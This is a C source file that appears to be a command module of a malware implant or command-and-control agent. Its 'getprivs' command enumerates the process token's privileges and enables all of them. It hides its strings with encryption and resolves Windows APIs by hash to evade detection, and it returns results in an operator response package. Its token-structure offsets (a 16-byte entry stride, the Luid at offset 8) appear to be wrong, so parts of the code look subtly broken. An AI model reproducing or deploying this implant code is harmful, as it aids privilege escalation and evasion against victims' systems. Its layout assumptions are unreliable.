#include "config.h"
#ifdef INCLUDE_CMD_GETPRIVS

#include "commands.h"
#include "common.h"

// Advapi32 forwards several token APIs (AdjustTokenPrivileges on recent Win11)
// to KernelBase - resolving a forwarded export yields the forwarder string and
// calling it crashes. Resolve from KernelBase first, fall back to Advapi32.
typedef BOOL  (WINAPI *fn_OpenProcessToken)(HANDLE, DWORD, PHANDLE);
typedef BOOL  (WINAPI *fn_GetTokenInformation)(HANDLE, DWORD, LPVOID, DWORD, PDWORD);
typedef BOOL  (WINAPI *fn_LookupPrivilegeNameW)(LPCWSTR, PLUID, LPWSTR, PDWORD);
typedef BOOL  (WINAPI *fn_AdjustTokenPrivileges)(HANDLE, BOOL, LPVOID, DWORD, LPVOID, PDWORD);
typedef int   (WINAPI *fn_WideCharToMultiByte_t)(UINT, DWORD, LPCWSTR, int, LPSTR, int, LPCSTR, LPBOOL);

#ifndef SE_PRIVILEGE_ENABLED
#define SE_PRIVILEGE_ENABLED 0x00000002
#endif
#ifndef SE_PRIVILEGE_ENABLED_BY_DEFAULT
#define SE_PRIVILEGE_ENABLED_BY_DEFAULT 0x00000001
#endif

// native LUID_AND_ATTRIBUTES stride inside TOKEN_PRIVILEGES.Prileges[]
#define TP_ENTRY_STRIDE 16

static PVOID _resolve2(PINSTANCE inst, const char* func) {
    xstr(_kbase, "kernelbase.dll");
    xstr(_adv, "advapi32.dll");
    HMODULE h_kbase = inst->Win32.LoadLibraryA(_kbase);
    PVOID p = NULL;
    if (h_kbase) p = resolve_function((PVOID)h_kbase, hash_string_djb2(func));
    if (!p) {
        HMODULE h_adv = inst->Win32.LoadLibraryA(_adv);
        if (h_adv) p = resolve_function((PVOID)h_adv, hash_string_djb2(func));
    }
    return p;
}

// getprivs: list the process token's privileges and enable all of them
// (algorithm from Starburst cmd_getprivs)
VOID cmd_getprivs(PINSTANCE inst, PPARSER args, PPACKAGE response) {
    fn_OpenProcessToken     pOpenProcessToken = (fn_OpenProcessToken)_resolve2(inst, XSTR("OpenProcessToken"));
    fn_GetTokenInformation  pGetTokenInformation = (fn_GetTokenInformation)_resolve2(inst, XSTR("GetTokenInformation"));
    fn_LookupPrivilegeNameW pLookupPrivilegeNameW = (fn_LookupPrivilegeNameW)_resolve2(inst, XSTR("LookupPrivilegeNameW"));
    fn_AdjustTokenPrivileges pAdjustTokenPrivileges = (fn_AdjustTokenPrivileges)_resolve2(inst, XSTR("AdjustTokenPrivileges"));
    fn_WideCharToMultiByte_t pWideCharToMultiByte = (fn_WideCharToMultiByte_t)resolve_function(
        inst->Modules.Kernel32, hash_string_djb2(XSTR("WideCharToMultiByte")));
    if (!pOpenProcessToken || !pGetTokenInformation || !pLookupPrivilegeNameW || !pAdjustTokenPrivileges || !pWideCharToMultiByte) {
        package_add_string(inst, response, XSTR("token API resolve failed"));
        response->is_error = TRUE;
        return;
    }

    HANDLE h_token = NULL;
    HANDLE h_proc = (HANDLE)(ULONG_PTR)-1; // current process pseudo handle
    if (!pOpenProcessToken(h_proc, 0x0028 /*TOKEN_ADJUST_PRIVILEGES|TOKEN_QUERY*/, &h_token)) {
        package_add_string(inst, response, XSTR("OpenProcessToken failed"));
        response->is_error = TRUE;
        return;
    }

    DWORD needed = 0;
    pGetTokenInformation(h_token, 3 /*TokenPrivileges*/, NULL, 0, &needed);
    if (needed == 0) {
        gate_CloseHandle(inst, h_token);
        package_add_string(inst, response, XSTR("GetTokenInformation failed"));
        response->is_error = TRUE;
        return;
    }

    BYTE* tp_buf = (BYTE*)es_malloc(inst, needed);
    if (!tp_buf) {
        gate_CloseHandle(inst, h_token);
        package_add_string(inst, response, XSTR("alloc failed"));
        response->is_error = TRUE;
        return;
    }

    if (!pGetTokenInformation(h_token, 3 /*TokenPrivileges*/, tp_buf, needed, &needed)) {
        es_free(inst, tp_buf);
        gate_CloseHandle(inst, h_token);
        package_add_string(inst, response, XSTR("GetTokenInformation failed"));
        response->is_error = TRUE;
        return;
    }

    DWORD priv_count = *(DWORD*)tp_buf;
    // native LUID_AND_ATTRIBUTES array starts after PrivilegeCount (stride 16)
    BYTE* entries = tp_buf + 4;

    char result[4096] = {0};
    DWORD off = 0;

    for (DWORD i = 0; i < priv_count && off < 3900; i++) {
        BYTE* entry = entries + (i * TP_ENTRY_STRIDE);
        LUID* luid = (LUID*)entry;
        DWORD attrs = *(DWORD*)(entry + 8);

        wchar_t priv_name_w[64];
        es_memset(priv_name_w, 0, sizeof(priv_name_w));
        DWORD name_len = 64;
        if (!pLookupPrivilegeNameW(NULL, luid, priv_name_w, &name_len))
            continue;

        char priv_name[128] = {0};
        pWideCharToMultiByte(0 /*CP_ACP*/, 0, priv_name_w, -1, priv_name, 128, NULL, NULL);

        DWORD nlen = 0;
        while (priv_name[nlen] && nlen < 127) nlen++;
        for (DWORD j = 0; j < nlen && off < 4050; j++) result[off++] = priv_name[j];
        for (DWORD pad = nlen; pad < 40 && off < 4050; pad++) result[off++] = ' ';

        if (attrs & SE_PRIVILEGE_ENABLED_BY_DEFAULT) {
            const char* s = XSTR("Enabled (Default)");
            for (int j = 0; s[j] && off < 4090; j++) result[off++] = s[j];
        } else if (attrs & SE_PRIVILEGE_ENABLED) {
            const char* s = XSTR("Enabled");
            for (int j = 0; s[j] && off < 4090; j++) result[off++] = s[j];
        } else {
            const char* s = XSTR("Disabled");
            for (int j = 0; s[j] && off < 4090; j++) result[off++] = s[j];
        }
        result[off++] = '\n';

        // enable it: single-entry TOKEN_PRIVILEGES with proper buffer size
        BYTE tp_single[20];
        es_memset(tp_single, 0, sizeof(tp_single));
        *(DWORD*)(tp_single) = 1;              // PrivilegeCount
        *(LUID*)(tp_single + 8) = *luid;       // Privileges[0].Luid
        *(DWORD*)(tp_single + 16) = SE_PRIVILEGE_ENABLED;
        pAdjustTokenPrivileges(h_token, FALSE, tp_single, sizeof(tp_single), NULL, NULL);
    }
    result[off] = '\0';

    es_free(inst, tp_buf);
    gate_CloseHandle(inst, h_token);

    if (off == 0) {
        package_add_string(inst, response, XSTR("No privileges found"));
    } else {
        package_add_string(inst, response, result);
    }
}

#endif
